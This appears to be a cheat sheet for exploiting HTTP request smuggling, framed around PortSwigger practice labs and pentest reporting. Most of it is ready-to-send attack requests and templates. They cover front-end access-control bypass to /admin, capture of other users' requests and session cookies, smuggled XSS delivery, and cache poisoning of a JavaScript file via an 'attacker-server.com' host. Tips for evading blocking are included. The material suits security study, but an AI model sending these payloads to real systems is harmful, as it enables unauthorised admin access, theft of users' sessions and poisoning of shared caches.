# HTTP Request Smuggling - Quick Start Guide

**Goal:** Rapidly test for and exploit HTTP request smuggling vulnerabilities in 5-15 minutes.

## Prerequisites
- Burp Suite Professional (with HTTP Request Smuggler extension)
- Target application with front-end/back-end server architecture

---

## Quick Detection (2-3 minutes)

### Method 1: Time-Based Detection

**CL.TE Test:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```
**Expected:** 10+ second delay = vulnerable

**TE.CL Test:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
**Expected:** 10+ second delay = vulnerable

### Method 2: Automated Scanning
1. Install HTTP Request Smuggler from BApp Store
2. Right-click any request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Check "Issues" tab for findings

---

## Quick Exploitation Patterns

### Pattern 1: Bypass Admin Access (3-5 minutes)

**For CL.TE vulnerability:**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

**Send TWICE.** Second response shows admin panel.

**Tips:**
- Switch to HTTP/1 in Burp Inspector
- Adjust Content-Length to match actual byte count
- Try `Host: localhost` or `Host: 127.0.0.1`

---

### Pattern 2: Capture User Requests (5-7 minutes)

**Step 1:** Find data storage endpoint (comment form, profile update, etc.)

**Step 2:** Smuggle with oversized Content-Length:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR-SESSION

csrf=TOKEN&postId=1&comment=captured&email=you@example.com
```

**Send once.** Check stored comments for captured victim request with cookies.

**Timing:** Repeat 2-3 times if victim simulator is intermittent.

---

### Pattern 3: Deliver XSS (4-6 minutes)

**Step 1:** Find reflected parameter (User-Agent, Referer, etc.)

**Step 2:** Smuggle XSS payload:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /vulnerable-page HTTP/1.1
User-Agent: "/><script>alert(1)</script>
Content-Length: 5

x=1
```

**Send once.** Next user receives XSS response.

---

### Pattern 4: Cache Poisoning (5-8 minutes)

**Step 1:** Identify cacheable static resource

**Step 2:** Poison cache with redirect:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 129
Transfer-Encoding: chunked

0

GET /static/js/tracking.js HTTP/1.1
Host: attacker-server.com
Content-Length: 10

x=1
```

**Step 3:** Request `/static/js/tracking.js` to verify cached redirect

---

## HTTP/2 Quick Tests (3-5 minutes)

### H2.CL Basic Test:
```http
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: localhost
```

**Expected:** Alternating 404 responses = vulnerable

### HTTP/2 CRLF Injection:
1. Send GET / in Burp Repeater (HTTP/2)
2. Add custom header in Inspector:
   - Name: `foo`
   - Value: `bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com`
3. Send request
4. Check for admin panel in response

**Use Shift+Return in Inspector to add newlines**

---

## Browser-Based Quick Test (CL.0) (5-10 minutes)

### Detection:
```http
POST /resources/images/blog.svg HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Connection: keep-alive

GET /admin HTTP/1.1
Host: localhost
```

Send in group with normal GET request. Check for admin access.

---

## Burp Suite Speed Tips

### Essential Configuration:
1. **Switch to HTTP/1:** Inspector → Request Attributes → HTTP/1
2. **Disable Auto-Length:** Repeater menu → uncheck "Update Content-Length"
3. **Send Twice:** Most attacks require sending request twice
4. **Group Sending:** Create tab group → right-click → "Send group in sequence (single connection)"

### HTTP Request Smuggler Extension:
- Automates detection of all variants
- Generates payloads automatically
- Calculates Content-Length correctly
- Shows potential attack vectors

---

## Common Mistakes & Quick Fixes

### Issue: Attack Not Working
**Fix 1:** Count bytes manually including CRLF (`\r\n` = 2 bytes)
**Fix 2:** Send request multiple times (victim timing)
**Fix 3:** Try alternative techniques (CL.TE → TE.CL → TE.TE)
**Fix 4:** Verify HTTP/1 protocol in use

### Issue: Connection Resets
**Fix:** Send 10 normal GET requests to reset connection state

### Issue: Missing CRLF
**Fix:** Ensure trailing `\r\n\r\n` after final chunk (use hex view to verify)

### Issue: Wrong Protocol
**Fix:** Many labs support HTTP/2 but require HTTP/1 for exploitation

---

## Lab Speed Run Strategy

**Apprentice Labs (2-3 min each):**
1. Basic CL.TE: Send smuggling payload twice
2. Basic TE.CL: Disable auto-length, send twice
3. Obfuscating TE: Add `Transfer-encoding: cow`, send twice

**Practitioner Labs (5-8 min each):**
1. Differential responses: Smuggle `/404` path
2. Bypass controls: Add `Host: localhost` header
3. Reveal headers: Use search reflection technique
4. Capture requests: Oversized Content-Length in comment form
5. Cache deception: Wait 30 seconds, smuggle to `/my-account`

**Expert Labs (10-15 min each):**
1. H2.CL: Use HTTP/2 with `Content-Length: 0`
2. Response queue poisoning: Smuggle, wait 5s, resend
3. Request tunnelling: CRLF in header names
4. CL.0: Test static resources with keep-alive
5. Pause-based: Use Turbo Intruder with 61s pause

---

## Essential Payloads Cheat Sheet

### CL.TE Template:
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: [CALCULATE]
Transfer-Encoding: chunked

0

[SMUGGLED REQUEST]
```

### TE.CL Template:
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

[HEX-LENGTH]
[SMUGGLED REQUEST]
0


```

### H2.CL Template:
```http
POST / HTTP/2
Host: TARGET
Content-Length: 0

[SMUGGLED REQUEST]
```

---

## Success Indicators

**Vulnerability Confirmed:**
- ✓ Time delays (10+ seconds)
- ✓ 404 errors on valid paths
- ✓ Alternating responses
- ✓ Unrecognized method errors (GPOST)

**Exploitation Successful:**
- ✓ Admin panel accessible
- ✓ User requests captured
- ✓ XSS delivered to victim
- ✓ Cache poisoned

---

## Quick Reference: Byte Counting

```
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
\r\n

Breakdown:
G E T   / a d m i n   H T T P / 1 . 1 \r \n = 18+2 = 20
H o s t :   l o c a l h o s t \r \n = 17+2 = 19
\r \n = 2
Total = 41 bytes
```

**Quick Formula:**
- Request line + 2
- Each header + 2
- Empty line = 2

---

## Next Steps After Detection

1. **Document:** Screenshot evidence, save requests
2. **Classify:** Determine variant (CL.TE, TE.CL, etc.)
3. **Impact:** Test for admin access, data theft, cache poisoning
4. **Report:** Include CVSS score, remediation steps

---

## Emergency Troubleshooting

**Nothing works?**
1. Verify target has front-end/back-end architecture
2. Check if HTTP/2 downgrading occurs
3. Try different endpoints (/, /admin, /api)
4. Test with Burp's HTTP Request Smuggler extension
5. Review lab hints/solutions if practicing

**Attack detected/blocked?**
1. Try obfuscation (TE.TE variants)
2. Use different HTTP methods
3. Test alternative endpoints
4. Adjust timing between requests

---

## Practice Resources

**PortSwigger Labs (FREE):**
- 20 hands-on labs covering all techniques
- Difficulty: Apprentice → Expert
- No registration required
- Safe practice environment

**Start here:** https://portswigger.net/web-security/request-smuggling

**Recommended order:**
1. Basic CL.TE (3 min)
2. Basic TE.CL (3 min)
3. Confirming CL.TE (5 min)
4. Bypass front-end controls (8 min)
5. Continue through advanced labs

---

**Time Budget:** 15 minutes for basic detection and exploitation, 30-60 minutes for mastery of all techniques.
